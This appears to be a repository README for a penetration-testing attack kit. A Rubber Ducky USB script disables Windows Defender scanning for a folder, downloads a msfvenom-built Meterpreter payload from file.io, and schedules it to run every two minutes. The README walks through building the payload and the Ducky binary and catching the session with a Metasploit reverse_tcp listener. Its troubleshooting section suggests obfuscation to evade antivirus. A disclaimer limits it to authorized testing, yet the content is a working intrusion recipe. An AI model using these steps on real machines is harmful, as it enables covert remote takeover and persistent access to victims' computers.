

# Reverse Shell Payload Script

This repository contains a Rubber Ducky script that automates disabling Windows Defender and launching a PowerShell reverse shell to establish a persistent connection with a remote server. This script is intended for educational and authorized security testing purposes only.

## **Disclaimer**

> ⚠️ This tool is for ethical hacking and penetration testing **with permission** only. Unauthorized use of this script against a system without consent is strictly prohibited. Misuse may lead to legal consequences.

## **Features**

- Disables Windows Security (specifically, Virus & Threat Protection)
- Executes a hidden PowerShell reverse shell command to connect to a remote server

## Prerequisites
- Linux Device: `createMeterpreter.sh` is intended to run on a Linux system with access to Metasploit Framework (msfvenom) and curl.
- Windows Target: The target machine must be Windows-based to execute the payload.
- File.io: The `createMeterpreter.s`h script uses file.io for file hosting and downloading.
- ensure you have the following installed:
- Metasploit Framework (msfvenom)
- curl
- A web browser or terminal to access the `file.io` link for downloading the payload


## How to Use
### 1. Generate and Upload the Payload
- Run the createMeterpreter.sh script on your Linux machine:

```
chmod +x createMeterpreter.sh
./createMeterpreter.sh
```
The script will prompt you for two inputs:

- URL: Enter the public IP or a URL (e.g., 0.tcp.in.ngrok.io if using Ngrok).
- Port: Enter the port number (e.g., 18054).
- The script will generate the Meterpreter payload using msfvenom, save it as meterpreter.exe, and upload it to file.io. After uploading, - The script will print a unique URL for the uploaded file (e.g., https://file.io/noTLXo6PXXKX).

### 2. Modify the Payload URL in the payload.dd Script
- Copy the file.io URL from the output of createMeterpreter.sh and replace the placeholder URL in the payload.dd script.

#### Example:

```
STRING Invoke-WebRequest -Uri https://file.io/noTLXo6PXXKX -OutFile C:\Users\Public\meterpreter.exe
Ensure that the URL in payload.dd corresponds to the file you just uploaded.
```
### 3. Use the Rubber Ducky to Execute the Payload
- The payload.dd script is designed for use with a Rubber Ducky USB HID device. When the device is plugged into the target Windows machine, it will automatically execute the following actions:

- Open PowerShell with administrative privileges.
- Disable Windows Defender real-time protection for the path C:\Users\Public.
- Download the Meterpreter payload from file.io using the link you modified in step 2.
- Save the payload to C:\Users\Public\meterpreter.exe.
- Create a scheduled task to execute the payload every 2 minutes.
- To use the script, compile it into a .bin file and load it onto your Rubber Ducky device using the DuckEncoder tool:

```
java -jar duckencode.jar -i payload.dd -o payload.bin
```
Then, load the payload.bin onto your Rubber Ducky and insert it into the target Windows machine.

## 4. Start the Listener in Metasploit
- Once the payload is executed on the target system, you can start a listener on your Linux machine using Metasploit to catch the       
  Meterpreter session:

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit
```
Replace <your_ip> and <your_port> with the values you used in createMeterpreter.sh.

Once the target system triggers the payload, you will gain access to the Meterpreter session in Metasploit.

## Troubleshooting
- File not downloading: Ensure the URL is correct in the payload.dd script and that the file is still available on file.io.
- Firewall or antivirus: The payload may be blocked by the target system's antivirus. Try using obfuscation techniques or alternative file-sharing services if necessary.
- Metasploit session issues: Make sure the Metasploit listener (multi/handler) is properly configured with the correct LHOST and LPORT.
Notes
- This project is intended for educational purposes only. Always get explicit permission before attempting to use this technique on any system.
- Ensure you're complying with legal and ethical guidelines while performing penetration testing.
